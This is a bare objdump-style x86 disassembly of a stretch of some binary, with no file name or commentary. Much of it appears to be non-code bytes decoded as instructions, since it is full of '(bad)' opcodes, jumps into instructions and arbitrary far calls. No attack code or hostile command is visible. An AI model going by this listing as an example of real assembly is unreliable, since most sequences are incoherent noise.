  432f9b:	add    bh,bh
  432f9d:	xor    DWORD PTR [ebp-0x3d],0x0
  432fa1:	mov    ch,0x62
  432fa3:	add    BYTE PTR [ebx-0x7c98cb34],al
  432fa9:	cld    
  432faa:	jg     0x432f35
  432fac:	(bad)  
  432fad:	dec    DWORD PTR ds:0x8708cc12
  432fb3:	(bad)  
  432fb4:	inc    DWORD PTR [eax]
  432fb6:	sub    dh,cl
  432fb8:	call   FWORD PTR [ebx]
  432fba:	popf   
  432fbb:	inc    DWORD PTR [eax]
  432fbd:	(bad)  
  432fbe:	jmp    0x432f59
  432fc0:	add    BYTE PTR [esi+0x21],bl
  432fc3:	cmp    edi,0xffffffff
  432fc6:	gs loope 0x432fc8
  432fc9:	(bad)  
  432fca:	cmp    bh,0xff
  432fcd:	add    BYTE PTR [ebx+edi*8],dh
  432fd0:	int3   
  432fd1:	jne    0x432fc6
  432fd3:	cmp    edi,0xffffffff
  432fd6:	push   esi
  432fd7:	popa   
  432fd8:	add    BYTE PTR [ebx-0x1a],dl
  432fdb:	cmp    edi,0xffffff83
  432fde:	call   esp
  432fe0:	inc    eax
  432fe2:	pop    esp
  432fe3:	inc    DWORD PTR [ebx-0x721501]
  432fe9:	mov    edx,0xff00003d
  432fee:	shl    al,1
  432ff0:	push   DWORD PTR [ecx]
  432ff2:	inc    esi
  432ff3:	add    BYTE PTR [eax],al
  432ff5:	call   DWORD PTR [ebx+0x2d]
  432ff8:	add    BYTE PTR [esp+esi*8+0x25ffcc00],cl
  432fff:	add    bh,bh
  433001:	jne    0x432f91
  433003:	inc    DWORD PTR [eax]
  433005:	push   esp
  433007:	std    
  433008:	jmp    ebx
  43300a:	(bad)  
  43300c:	inc    DWORD PTR [eax]
  43300e:	mov    eax,0xcbffc1
  433013:	add    DWORD PTR [eax],0xffffffff
  433016:	adc    al,0x41
  433018:	jmp    DWORD PTR ds:0xffccff6c
  43301e:	cmp    BYTE PTR [edi],cl
  433020:	call   DWORD PTR [edi-0x7cfffc]
  433026:	ret    0xfe
  433029:	xor    al,0xde
  43302b:	cmp    edi,0xffffffff
  43302e:	sbb    DWORD PTR [ecx-0xea7c01],0xffffffff
  433035:	push   DWORD PTR [edi+0x54]
  433038:	sub    eax,0x6
  43303b:	(bad)  
  43303c:	(bad)  
  43303d:	jmp    FWORD PTR [esp+eax*8]
  433040:	add    BYTE PTR [ecx-0x760033d9],bl
  433046:	imul   esp,DWORD PTR [esi+0x0],0xffffd328
  43304d:	add    BYTE PTR [ebx-0x31e6002e],cl
  433053:	(bad)  
  433054:	inc    DWORD PTR [eax]
  433056:	retf   0xaa
  433059:	xor    BYTE PTR [ecx-0x3fffff7d],0x2a
  433060:	dec    DWORD PTR [edx]
  433062:	stos   BYTE PTR es:[edi],al
  433063:	(bad)  
  433064:	inc    DWORD PTR [eax]
  433066:	shl    BYTE PTR [edi+0x8c5dff],cl
  43306c:	dec    esp
  43306e:	ins    DWORD PTR es:[edi],dx
  43306f:	leave  
  433070:	and    DWORD PTR [ebx],0xffffffb9
  433073:	cmp    edi,0xffffff83
  433076:	ja     0x4330d9
  433078:	call   DWORD PTR [ecx]
  43307a:	adc    ah,cl
  43307c:	mov    esp,ecx
  43307e:	add    BYTE PTR [esi],0x89
  433081:	pop    edi
  433082:	sub    al,BYTE PTR [eax]
  433084:	inc    DWORD PTR [eax]
  433086:	cmp    esp,edi
  433088:	add    ah,bh
  43308a:	mov    al,0xff
  43308c:	(bad)  
  43308d:	(bad)  
  43308e:	fild   WORD PTR [esi-0x1]
  433091:	outs   dx,DWORD PTR ds:[esi]
  433092:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433093:	mov    edi,edi
  433095:	adc    DWORD PTR [eax-0x738d002b],0xffffffff
  43309c:	add    bh,bh
  43309e:	mov    bl,BYTE PTR [ebx]
  4330a0:	call   DWORD PTR [edx+0x52]
  4330a3:	cmp    edi,0xffffff89
  4330a6:	pop    ss
  4330a7:	gs push edi
  4330aa:	jae    0x4330ab
  4330ac:	add    BYTE PTR [eax],al
  4330ae:	mov    al,ds:0xbfdefff4
  4330b3:	add    BYTE PTR [eax],al
  4330b5:	add    BYTE PTR [edi],bh
  4330b7:	fdiv   st(7),st
  4330b9:	sahf   
  4330ba:	push   esp
  4330bb:	int3   
  4330bc:	(bad)  
  4330bd:	(bad)  
  4330be:	std    
  4330bf:	inc    ecx
  4330c0:	push   DWORD PTR [esi-0x7c00ffe2]
  4330c6:	retf   0x13
  4330c9:	pop    es
  4330ca:	sub    edi,edi
  4330cc:	(bad)  
  4330cd:	call   FWORD PTR [eax-0x61]
  4330d0:	add    BYTE PTR [edx],bl
  4330d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4330d3:	(bad)  
  4330d4:	inc    DWORD PTR [eax]
  4330d6:	shr    DWORD PTR [ebx-0x7cc9f401],cl
  4330dc:	add    BYTE PTR [eax],al
  4330de:	in     eax,dx
  4330df:	xor    ecx,DWORD PTR [ecx-0x65c1]
  4330e5:	jmp    DWORD PTR [eax-0x3e]
  4330e8:	and    DWORD PTR [ebx-0x763343],0x5
  4330ef:	fdivr  st,st(7)
  4330f1:	or     eax,0xff83ff19
  4330f6:	aaa    
  4330f7:	ins    DWORD PTR es:[edi],dx
  4330f8:	int3   
  4330f9:	mov    al,ds:0x89890008
  4330fe:	(bad)  
  4330ff:	iret   
  433100:	push   DWORD PTR [edx-0x3300ffb5]
  433106:	rcl    BYTE PTR [ebx+0x0],1
  433109:	and    esi,DWORD PTR [eax]
  43310b:	(bad)  
  43310c:	(bad)  
  43310d:	push   edi
  43310f:	ret    
  433110:	add    BYTE PTR [edi-0x7cffac],dh
  433116:	sub    dh,BYTE PTR [ecx]
  433118:	call   FWORD PTR [edx]
  43311a:	test   BYTE PTR [ecx-0x46c10000],cl
  433120:	add    BYTE PTR [esi-0x7c007c35],bh
  433126:	outs   dx,BYTE PTR ds:[esi]
  433127:	push   ebx
  433128:	(bad)  
  433129:	mov    esi,0xff89fffe
  43312e:	fs es dec eax
  433132:	js     0x433133
  433134:	inc    DWORD PTR [eax]
  433136:	arpl   bp,dx
  433138:	jmp    DWORD PTR [ebx+0x89f9]
  43313e:	adc    al,0xaa
  433140:	add    BYTE PTR [ecx],ah
  433142:	or     DWORD PTR [ecx-0x75baff34],0x83b692ff
  43314c:	inc    DWORD PTR [eax]
  43314e:	and    eax,0xe7ae83a3
  433153:	mov    edi,edi
  433155:	add    cl,dh
  433157:	or     cl,BYTE PTR [ecx-0x33006fd3]
  43315d:	add    BYTE PTR [edi+0x7350ffcc],ah
  433163:	add    bh,bh
  433165:	add    al,cl
  433167:	pop    esi
  433168:	int3   
  433169:	aas    
  43316a:	add    bh,bh
  43316c:	add    bh,bh
  43316e:	scas   eax,DWORD PTR es:[edi]
  43316f:	sub    ecx,esp
  433171:	push   cs
  433172:	jno    0x433173
  433174:	(bad)  
  433175:	(bad)  
  433176:	fdiv   DWORD PTR [edi]
  433178:	inc    DWORD PTR [ebx+0x27]
  43317b:	cmp    edi,0xffffffcc
  43317e:	xor    eax,0xf2f5ff4c
  433183:	int3   
  433184:	(bad)  
  433185:	jmp    DWORD PTR [edx]
  433187:	or     edi,edi
  433189:	les    esi,FWORD PTR [esi]
  43318b:	add    bh,bh
  43318d:	dec    DWORD PTR [edi+0x2b3f8380]
  433193:	add    DWORD PTR [eax],0xffffffff
  433196:	in     al,dx
  433197:	add    edi,edi
  433199:	test   esi,0x9effff00
  43319f:	push   ecx
  4331a0:	add    BYTE PTR [eax],dh
  4331a2:	push   cs
  4331a3:	(bad)  
  4331a4:	dec    esp
  4331a6:	adc    al,0x93
  4331a8:	sbb    DWORD PTR ds:0xff8383b9,0xffffffc1
  4331af:	ud0    esi,DWORD PTR ds:0x83ffff34
  4331b6:	pop    edx
  4331b7:	loope  0x4331b9
  4331b9:	push   esi
  4331ba:	push   ss
  4331bb:	(bad)  
  4331bc:	dec    DWORD PTR [ecx-0x5000cd3f]
  4331c2:	adc    bh,bh
  4331c4:	inc    DWORD PTR [eax]
  4331c6:	jo     0x433181
  4331c8:	add    BYTE PTR [ecx-0xff0064],bl
  4331ce:	jmp    0x9b043290
  4331d3:	mov    edi,edi
  4331d5:	jmp    DWORD PTR [ebx+0x4fecfff8]
  4331db:	inc    DWORD PTR [eax]
  4331dd:	add    BYTE PTR [eax],al
  4331df:	add    DWORD PTR [ebx-0xffcaf3],0xcc73cdff
  4331e9:	int3   
  4331ea:	int3   
  4331eb:	int3   
  4331ec:	int3   
  4331ed:	int3   
  4331ee:	int3   
  4331ef:	int3   
  4331f0:	add    BYTE PTR [eax],bh
  4331f2:	mov    ch,0xff
  4331f4:	pop    edx
  4331f5:	inc    WORD PTR [eax]
  4331f8:	inc    DWORD PTR [edi-0x7cff28]
  4331fe:	cli    
  4331ff:	mov    al,ds:0xffbc49ff
  433204:	mov    fs,WORD PTR [ebx]
  433206:	inc    DWORD PTR [eax]
  433208:	add    BYTE PTR [ecx+ebp*8],al
  43320b:	inc    DWORD PTR [eax]
  43320d:	(bad)  
  43320e:	jl     0x433255
  433210:	jmp    eax
  433212:	mov    ah,0x89
  433214:	pop    ebx
  433215:	fwait
  433216:	inc    DWORD PTR [eax]
  433218:	xor    DWORD PTR [eax-0x7c0000f2],0xfffffff4
  43321f:	pop    esp
  433220:	call   FWORD PTR [ebp-0x7b]
  433223:	int3   
  433224:	and    al,0x15
  433226:	inc    DWORD PTR [eax]
  433228:	add    bh,bh
  43322a:	pop    edi
  43322b:	add    DWORD PTR [ebx-0x33c73e01],0x61
  433232:	dec    esi
  433233:	add    BYTE PTR [edx-0x33ff00ad],ah
  433239:	cmp    esi,edx
  43323b:	cmp    edi,0xffffffff
  43323e:	and    DWORD PTR [ebp+0x0],eax
  433241:	ret    0x8322
  433244:	adc    eax,0xffff0061
  433249:	xchg   esp,eax
  43324a:	imul   edi,edi,0xffffffff
  43324d:	sub    eax,0x69
  433250:	sub    ebx,0x9
  433253:	push   DWORD PTR [edx+edx*4]
  433256:	dec    DWORD PTR [ecx+0xdf34ff]
  43325c:	add    DWORD PTR [eax],0x4f
  43325f:	or     eax,0x4d39ff
  433264:	push   ebp
  433265:	mov    ch,0xff
  433267:	(bad)  
  433268:	jmp    DWORD PTR [ecx-0x7c]
  43326b:	inc    DWORD PTR [ebx-0xfc2f7d]
  433271:	mov    ebx,0x7ffd0002
  433276:	add    DWORD PTR [ebx-0x20b300],0xffffffff
  43327d:	push   eax
  43327f:	leave  
  433280:	inc    DWORD PTR [ebp-0x3f]
  433283:	add    BYTE PTR [edx-0x7633ff23],ch
  433289:	rcl    bl,cl
  43328b:	add    bh,bh
  43328d:	jmp    FWORD PTR [eax+ecx*1-0x1]
  433291:	jmp    0xff83:0xe021ff9f
  433298:	add    BYTE PTR [edi-0x760091],bl
  43329e:	xor    eax,0x1394ff47
  4332a3:	jmp    FWORD PTR [edi-0xff00e6]
  4332a9:	addr16 push 0x0
  4332ac:	(bad)  
  4332ad:	dec    DWORD PTR [esi+esi*4-0x1]
  4332b1:	cmp    al,0xed
  4332b3:	int3   
  4332b4:	scas   eax,DWORD PTR es:[edi]
  4332b5:	push   es
  4332b6:	add    DWORD PTR [ebx-0x76cb0834],0x0
  4332bd:	dec    DWORD PTR [edi]
  4332bf:	xchg   esi,eax
  4332c0:	mov    DWORD PTR [ecx],edi
  4332c2:	mov    DWORD PTR ds:[eax],ebx
  4332c5:	inc    ecx
  4332c6:	add    bh,bh
  4332c8:	jmp    DWORD PTR [edi-0xdd]
  4332ce:	xlat   BYTE PTR ds:[ebx]
  4332cf:	out    dx,al
  4332d0:	add    bl,ch
  4332d2:	push   cs
  4332d3:	mov    DWORD PTR [ecx+0x49],ecx
  4332d6:	dec    DWORD PTR [ecx-0x245f00]
  4332dc:	add    DWORD PTR [eax],0x6b
  4332df:	lahf   
  4332e0:	push   ebx
  4332e2:	gs int3 
  4332e4:	shl    DWORD PTR [eax+0x0],cl
  4332e7:	add    bh,bh
  4332e9:	call   0x4233eb
  4332ee:	xchg   esi,eax
  4332ef:	pop    ebp
  4332f0:	push   DWORD PTR [ebx+0x2299fff5]
  4332f6:	dec    esp
  4332f8:	(bad)  
  4332f9:	(bad)  
  4332fa:	xor    al,0x83
  4332fc:	inc    DWORD PTR [eax]
  4332fe:	jg     0x43328b
  433300:	jmp    FWORD PTR [ebp+ecx*2-0xda6d00]
  433307:	add    bh,bh
  433309:	xchg   BYTE PTR [ecx-0x1],al
  43330c:	cmp    edi,0x51
  43330f:	jl     0x433294
  433311:	out    dx,al
  433312:	dec    ebx
  433313:	int3   
  433314:	xor    dl,BYTE PTR [edi+0x0]
  433317:	inc    DWORD PTR [ebx-0x7cff7d4c]
  43331d:	inc    DWORD PTR [edx+0xe]
  433320:	jmp    FWORD PTR [ecx+0x73]
  433323:	call   DWORD PTR [ecx]
  433325:	test   bh,bh
  433327:	inc    DWORD PTR [eax]
  433329:	or     DWORD PTR [ebx-0x5b76ff01],esi
  43332f:	xor    BYTE PTR [eax],al
  433331:	iret   
  433332:	fxch   st(4)
  433334:	or     ch,BYTE PTR [edi+edi*8]
  433337:	mov    edi,edi
  433339:	retf   
  43333a:	in     al,dx
  43333b:	(bad)  
  43333c:	inc    DWORD PTR [eax]
  43333e:	sbb    BYTE PTR [ecx-0x1],0x4a
  433342:	fwait
  433343:	jmp    FWORD PTR [eax+0xffff98]
  433349:	sub    DWORD PTR [edi],0xffffffff
  43334c:	cmp    edi,0x50
  43334f:	xchg   edx,eax
  433350:	or     ebx,0xffffffb7
  433353:	dec    DWORD PTR [edx-0x2c]
  433356:	inc    DWORD PTR [eax]
  433358:	call   DWORD PTR [edx]
  43335a:	ret    
  43335b:	add    bh,bh
  43335d:	sub    DWORD PTR [ebx+0xb],0xffffffff
  433361:	jne    0x43331c
  433363:	int3   
  433364:	dec    edx
  433365:	loop   0x433367
  433367:	(bad)  
  433368:	call   FWORD PTR [edi-0x5c]
  43336b:	add    BYTE PTR [eax],al
  43336d:	int3   
  43336e:	hlt    
  43336f:	leave  
  433370:	add    bh,al
  433372:	loopne 0x433374
  433374:	mov    ss,WORD PTR [ecx]
  433376:	mov    DWORD PTR [eax],eax
  433378:	add    BYTE PTR [edx+0x16],ch
  43337b:	inc    DWORD PTR [eax]
  43337d:	int3   
  43337e:	(bad)  
  433380:	add    BYTE PTR [esi],cl
  433382:	repz inc DWORD PTR [ebp-0x76008a]
  433389:	ins    DWORD PTR es:[edi],dx
  43338a:	(bad)  
  43338d:	sub    ebp,0xffffff9a
  433390:	add    BYTE PTR [edx+0x6d39ff52],ah
  433396:	inc    DWORD PTR [eax]
  433398:	inc    edx
  43339a:	cmp    bh,bh
  43339c:	or     esp,0xffffffd7
  43339f:	jo     0x4333a0
  4333a1:	mov    edi,0xfde80000
  4333a6:	mov    edi,edi
  4333a8:	(bad)  
  4333a9:	jnp    0x433361
  4333ab:	inc    DWORD PTR [ebx-0x6a7900]
  4333b1:	clc    
  4333b2:	out    0xff,eax
  4333b4:	xchg   esi,eax
  4333b5:	jo     0x4333b6
  4333b7:	add    BYTE PTR [eax],al
  4333b9:	sub    dh,BYTE PTR [ebx]
  4333bb:	mov    DWORD PTR [ebx+0xca0583],eax
  4333c1:	cmp    esp,DWORD PTR [edi]
  4333c3:	jmp    FWORD PTR [ecx+ebx*4+0x68ff0000]
  4333ca:	jle    0x43334f
  4333cc:	inc    DWORD PTR [eax]
  4333ce:	and    ch,BYTE PTR [esi-0x1]
  4333d1:	pop    ebx
  4333d2:	into   
  4333d3:	call   DWORD PTR [ecx-0xff00d8]
  4333d9:	ins    DWORD PTR es:[edi],dx
  4333da:	sbb    BYTE PTR [ebx-0x3600ff34],al
  4333e0:	add    BYTE PTR ds:0x5eb683f9,al
  4333e6:	(bad)  
  4333e7:	inc    DWORD PTR [eax]
  4333e9:	add    DWORD PTR [ebx],esp
  4333eb:	dec    DWORD PTR [ecx-0x33a85001]
  4333f1:	lods   al,BYTE PTR ds:[esi]
  4333f2:	and    al,BYTE PTR [eax]
  4333f4:	dec    ebx
  4333f5:	in     al,0xff
  4333f7:	add    ah,cl
  4333f9:	fyl2xp1 
  4333fb:	add    BYTE PTR [ebx-0x188700],al
  433401:	mov    cl,0xdf
  433403:	jmp    DWORD PTR [eax-0x7600ff1e]
  433409:	sub    BYTE PTR ss:[eax],al
  43340c:	add    BYTE PTR [eax],al
  43340e:	repz cdq 
  433410:	push   esi
  433412:	push   ebp
  433413:	jmp    DWORD PTR ds:0xffcc33
  433419:	or     cl,BYTE PTR [esi+0xbcc00ff]
  43341f:	fild   WORD PTR [eax]
  433421:	dec    ebx
  433422:	dec    ebp
  433423:	add    BYTE PTR [ebx+eax*2-0x1],bh
  433427:	cmp    edi,0x7c
  43342a:	jb     0x4333af
  43342c:	(bad)  
  43342d:	jmp    FWORD PTR [ebp+0x19238926]
  433433:	call   FWORD PTR [ebx-0x7c0000dc]
  433439:	push   0xffff89d5
  43343e:	mov    bh,0xc6
  433440:	add    dl,dh
  433442:	add    bh,bh
  433444:	adc    DWORD PTR [ebx+0x0],0xba8d00ff
  43344b:	inc    DWORD PTR [eax]
  43344d:	or     DWORD PTR [ebp-0x11],0xffffffff
  433451:	mov    ebp,0xbf82cc20
  433456:	add    bh,bh
  433458:	dec    DWORD PTR [edx+0x4]
  43345b:	inc    DWORD PTR [eax]
  43345d:	call   FWORD PTR [ebx+0x7b]
  433460:	add    BYTE PTR [edi+0x7d],al
  433463:	(bad)  
  433464:	cli    
  433465:	pop    ebp
  433466:	cmp    edi,0x0
  433469:	(bad)  
  43346a:	popf   
  43346b:	add    ah,cl
  43346d:	inc    edx
  43346f:	cld    
  433470:	int3   
  433471:	pop    ebp
  433472:	mov    edi,?
  433474:	leave  
  433475:	dec    esi
  433476:	(bad)  
  433477:	(bad)  
  433478:	(bad)  
  433479:	fsubr  QWORD PTR [eax-0x7d]
  43347c:	add    bh,bh
  43347e:	daa    
  43347f:	mov    al,0xcc
  433481:	sub    ch,BYTE PTR [ebx-0x33732701]
  433487:	add    DWORD PTR [ebx-0x7cb467],0xffffffff
  43348e:	xor    al,0xbf
  433490:	call   esi
  433492:	std    
  433493:	(bad)  
  433494:	aas    
  433495:	mov    edx,0xc283ccff
  43349a:	push   0xfffccff
  43349f:	mov    ah,cl
  4334a1:	leave  
  4334a2:	mov    cl,0xff
  4334a4:	adc    DWORD PTR [esp+ecx*8+0x0],0xcc2c4bff
  4334ac:	(bad)  
  4334ad:	call   esp
  4334af:	sar    bh,0xfb
  4334b2:	std    
  4334b3:	or     DWORD PTR [edi],0xfffffffa
  4334b6:	add    BYTE PTR [eax],al
  4334b8:	jmp    DWORD PTR [ecx-0xff16]
  4334be:	sbb    eax,0xdd73003b
  4334c3:	int3   
  4334c4:	icebp  
  4334c5:	mov    eax,0x2effffff
  4334ca:	ror    BYTE PTR [ecx-0x456aff01],cl
  4334d0:	int3   
  4334d1:	jns    0x43345d
  4334d3:	xor    DWORD PTR ds:0xffff86,0xb
  4334da:	imul   edi,edi,0xffffffff
  4334dd:	and    DWORD PTR [edi+ecx*2-0x1],0xffffffc1
  4334e2:	test   edi,edi
  4334e4:	shl    DWORD PTR ds:0xbeff00ff,1
  4334ea:	xchg   ecx,eax
  4334eb:	(bad)  
  4334ec:	inc    DWORD PTR [eax]
  4334ee:	pop    edx
  4334ef:	mov    edx,0xffb31583
  4334f4:	ss iret 
  4334f6:	add    BYTE PTR [eax],al
  4334f8:	int3   
  4334f9:	popf   
  4334fa:	pop    ds
  4334fb:	cmp    edi,0x0
  4334fe:	sbb    ch,BYTE PTR [edx-0x1]
  433501:	dec    ebp
  433502:	sbb    DWORD PTR [ecx-0x33003167],ecx
  433508:	dec    DWORD PTR [eax+0x5]
  43350b:	inc    DWORD PTR [eax]
  43350d:	inc    DWORD PTR [ecx+0x1e]
  433510:	adc    DWORD PTR [eax-0xe],0x0
  433514:	hlt    
  433515:	mov    esp,0x91ffff00
  43351a:	sldt   WORD PTR [ebx-0x8b717d]
  433521:	jecxz  0x43351f
  433523:	inc    DWORD PTR [eax+0x6e]
  433529:	push   edx
  43352a:	mov    al,0xff
  43352c:	add    DWORD PTR [ebx-0x1cffddd1],0x2e
  433533:	dec    DWORD PTR [ebp+0x71]
  433536:	cmp    edi,0xffffffcc
  433539:	sub    BYTE PTR [edi+edi*8],bl
  43353c:	cmp    edi,0xfffffff7
  43353f:	in     eax,dx
  433540:	int3   
  433541:	sbb    BYTE PTR [edi-0x77],bl
  433544:	scas   eax,DWORD PTR es:[edi]
  433545:	clc    
  433546:	inc    DWORD PTR [eax]
  433548:	jmp    FWORD PTR [esi]
  43354a:	jle    0x43354c
  43354c:	inc    DWORD PTR [ebx+0x50003c3f]
  433552:	add    DWORD PTR [eax],0x2
  433555:	add    al,BYTE PTR [eax]
  433557:	add    bh,bh
  433559:	dec    edi
  43355a:	push   eax
  43355b:	add    bh,bh
  43355d:	int3   
  43355e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43355f:	mov    ebx,0xccab64ff
  433564:	(bad)  
  433566:	add    bh,bh
  433568:	call   edx
  43356a:	test   edi,edi
  43356c:	inc    DWORD PTR [ebx-0x5d008afb]
  433572:	mov    edi,?
  433574:	scas   al,BYTE PTR es:[edi]
  433575:	ret    0xff
  433578:	jmp    FWORD PTR [ecx-0x33ff00c2]
  43357e:	mov    ah,0xa5
  433580:	(bad)  
  433581:	sti    
  433582:	add    bh,bh
  433584:	repnz adc bh,bh
  433587:	int3   
  433588:	jmp    FWORD PTR [edi-0x23]
  43358b:	int3   
  43358c:	dec    DWORD PTR [ecx+0x61831b1e]
  433592:	pop    esi
  433593:	int3   
  433594:	pop    edi
  433595:	repz inc DWORD PTR [ebx-0x76cf7d]
  43359c:	(bad)  
  43359d:	(bad)  
  43359e:	cmp    eax,0x34c9ff3b
  4335a3:	add    al,dh
  4335a5:	mov    esp,0xdfffcc00
  4335aa:	out    0xff,al
  4335ac:	inc    DWORD PTR [eax]
  4335ae:	dec    ecx
  4335af:	mov    edi,edi
  4335b1:	xlat   BYTE PTR ds:[ebx]
  4335b2:	sbb    eax,0xff16e0ff
  4335b7:	inc    DWORD PTR [eax]
  4335b9:	loop   0x43360a
  4335bb:	cmp    edi,0x0
  4335be:	push   cs
  4335bf:	into   
  4335c0:	add    BYTE PTR [esi],bl
  4335c2:	mov    eax,ds:0x832679ff
  4335c7:	(bad)  
  4335c8:	call   eax
  4335ca:	rol    BYTE PTR [ebx+0x6b0183ff],cl
  4335d0:	mov    DWORD PTR [edx],eax
  4335d2:	add    ecx,DWORD PTR [ecx-0x33ee51]
  4335d8:	int3   
  4335d9:	sub    BYTE PTR [esi+0x64ffcccc],al
  4335df:	outs   dx,BYTE PTR ds:[esi]
  4335e0:	dec    DWORD PTR [esp+eax*4+0x0]
  4335e4:	ret    0xcc20
  4335e7:	int3   
  4335e8:	add    BYTE PTR [eax-0xff0030],cl
  4335ee:	inc    ebp
  4335ef:	xchg   ebp,eax
  4335f0:	adc    edi,0xffffffda
  4335f3:	inc    DWORD PTR [edi]
  4335f5:	in     eax,dx
  4335f6:	add    BYTE PTR [ebx-0x58df01],al
  4335fc:	inc    DWORD PTR [eax]
  4335fe:	and    eax,0x6967ccdc
  433603:	jmp    DWORD PTR [esi+0x11]
  433609:	inc    esi
  43360a:	mov    BYTE PTR [eax],0xcc
  43360d:	sbb    DWORD PTR [esi-0x5e],0x0
  433611:	push   ss
  433612:	mov    al,ds:0xff4d3000
  433617:	dec    DWORD PTR [ecx-0xbfed]
  43361d:	int3   
  43361e:	shl    ebx,0xcc
  433621:	out    0x48,al
  433623:	add    BYTE PTR [edx+0xffcc11],dl
  433629:	inc    edi
  43362a:	sar    bh,1
  43362c:	add    bh,bh
  43362e:	scas   al,BYTE PTR es:[edi]
  43362f:	adc    DWORD PTR [eax],eax
  433631:	adc    eax,0x57d0007e
  433636:	inc    DWORD PTR [eax]
  433638:	jmp    DWORD PTR [esi-0x42]
  43363e:	retf   
  43363f:	lods   al,BYTE PTR ds:[esi]
  433640:	mov    DWORD PTR [eax],ebx
  433642:	stos   BYTE PTR es:[edi],al
  433643:	call   FWORD PTR [ecx-0x27]
  433646:	or     esp,0xffffff83
  433649:	and    ch,bh
  43364b:	add    BYTE PTR [ebx+0xae8b83],al
  433651:	mov    edx,0x19cf8315
  433656:	int3   
  433657:	(bad)  
  433658:	jmp    ebp
  43365a:	lods   al,BYTE PTR ds:[esi]
  43365b:	int3   
  43365c:	add    BYTE PTR [eax],al
  43365e:	or     DWORD PTR [edi-0x675901],ebx
  433664:	leave  
  433665:	sahf   
  433666:	inc    DWORD PTR [ebx-0x7c031900]
  43366c:	int3   
  43366d:	jmp    FWORD PTR [ebx+0x12]
  433670:	(bad)  
  433671:	cmp    al,0x28
  433673:	jmp    FWORD PTR [esi+esi*2+0x0]
  433677:	dec    esp
  433679:	test   al,bl
  43367b:	add    DWORD PTR [ebx-0xc4601],0xffffffbe
  433682:	js     0x433683
  433684:	sub    bh,BYTE PTR [ebx-0x77]
  433687:	inc    DWORD PTR [eax]
  433689:	jge    0x43361d
  43368b:	add    DWORD PTR [eax],0x0
  43368e:	int    0x27
  433690:	jmp    FWORD PTR [edi]
  433692:	jp     0x433693
  433694:	aaa    
  433695:	mov    edi,?
  433697:	(bad)  
  433698:	dec    esi
  43369a:	xchg   bh,bh
  43369c:	(bad)  
  43369d:	jmp    DWORD PTR [edx]
  43369f:	test   edi,edi
  4336a1:	mov    eax,0xbce9ffbf
  4336a6:	add    DWORD PTR [eax],0x0
  4336a9:	hlt    
  4336aa:	push   es
  4336ab:	int3   
  4336ac:	add    BYTE PTR [eax],al
  4336ae:	or     al,0xe0
  4336b0:	add    BYTE PTR [edi-0x76],dh
  4336b3:	(bad)  
  4336b4:	mov    eax,0xffff02
  4336b9:	aaa    
  4336ba:	xchg   esi,eax
  4336bb:	(bad)  
  4336bc:	inc    DWORD PTR [ebx+0x6700bf1f]
  4336c2:	add    BYTE PTR [eax],0xd7
  4336c5:	or     bh,bh
  4336c7:	dec    DWORD PTR [ecx+0x830f7a]
  4336cd:	sbb    DWORD PTR [edi+0x61e7ffeb],0xffffffcc
  4336d4:	sbb    edx,DWORD PTR [edi+edi*8-0x1]
  4336d8:	add    BYTE PTR [ecx+0xbc],bh
  4336de:	aas    
  4336df:	dec    ecx
  4336e0:	adc    edi,0x7f
  4336e3:	jmp    DWORD PTR [ecx-0xffffc2]
  4336e9:	lahf   
  4336ea:	sub    ecx,esp
  4336ec:	inc    DWORD PTR [eax]
  4336ee:	add    al,0xd5
  4336f0:	jmp    DWORD PTR [ebx-0x3f]
  4336f3:	(bad)  
  4336f4:	fmul   st,st(6)
  4336f6:	inc    DWORD PTR [eax]
  4336f8:	inc    DWORD PTR [eax]
  4336fa:	push   0x9eff0089
  4336ff:	or     eax,DWORD PTR [ebx+0x5fff9ebe]
  433705:	je     0x433706
  433707:	add    bh,bh
  433709:	ret    0xffe5
  43370c:	add    BYTE PTR [eax],al
  43370e:	leave  
  43370f:	arpl   di,di
  433711:	loope  0x433740
  433713:	mov    edx,ecx
  433715:	cmp    BYTE PTR [eax],al
  433717:	or     esp,0x2
  43371a:	rol    DWORD PTR [ebx+0x5207ff83],cl
  433720:	(bad)  
  433721:	mov    ebp,0xa56fff63
  433726:	add    BYTE PTR [eax],al
  433728:	add    DWORD PTR [edx+0x3c],0xffffff89
  43372c:	cmp    edi,0x5a
  43372f:	jp     0x433730
  433731:	dec    esi
  433732:	test   DWORD PTR [ebx-0x33338f49],eax
  433738:	or     DWORD PTR [ebx-0x7cffc5],0xfffffffc
  43373f:	xchg   edi,eax
  433740:	xor    DWORD PTR [edx],0xffffffb9
  433743:	inc    eax
  433745:	iret   
  433746:	add    ah,cl
  433748:	inc    edx
  43374a:	fwait
  43374b:	mov    DWORD PTR [ebx+0x246000],eax
  433751:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433752:	sbb    al,0xff
  433754:	xchg   BYTE PTR [esi+0x0],dh
  433757:	(bad)  
  433758:	push   ebp
  43375a:	es cmp edi,0xffffffff
  43375e:	and    eax,0x8c428333
  433763:	inc    DWORD PTR [edx]
  433765:	add    eax,DWORD PTR [eax]
  433767:	or     esp,0x73
  43376a:	add    edi,edi
  43376c:	cmp    edi,0xfffffff4
  43376f:	fiadd  WORD PTR [eax]
  433771:	fwait
  433772:	sub    al,0xff
  433774:	cwde   
  433775:	fisttp DWORD PTR [ecx-0x2072ff01]
  43377b:	cmp    edi,0xffffff89
  43377e:	and    eax,0x8feecc46
  433783:	(bad)  
  433784:	fdecstp 
  433786:	add    BYTE PTR [ebx-0xf3fa00],al
  43378c:	cmp    edi,0x45
  43378f:	jne    0x433790
  433791:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433792:	outs   dx,DWORD PTR ds:[esi]
  433793:	add    BYTE PTR [ebx+ebp*1-0x60ff0001],al
  43379a:	call   0xe542389e
  43379f:	retf   
  4337a0:	add    ah,bh
  4337a2:	(bad)  
  4337a3:	mov    edx,ebx
  4337a5:	pop    eax
  4337a6:	inc    DWORD PTR [eax]
  4337a8:	jmp    FWORD PTR [eax]
  4337aa:	mov    al,0x0
  4337ac:	add    DWORD PTR [ebx-0x5f004257],0x2
  4337b3:	add    BYTE PTR [edx],ch
  4337b5:	aaa    
  4337b6:	add    BYTE PTR [ecx+0x7c3ff],cl
  4337bc:	cmp    edi,0xffffffa6
  4337bf:	lds    eax,FWORD PTR [ebx+0x29831059]
  4337c5:	mov    al,0x83
  4337c7:	inc    DWORD PTR [eax]
  4337c9:	dec    eax
  4337ca:	retf   
  4337cb:	(bad)  
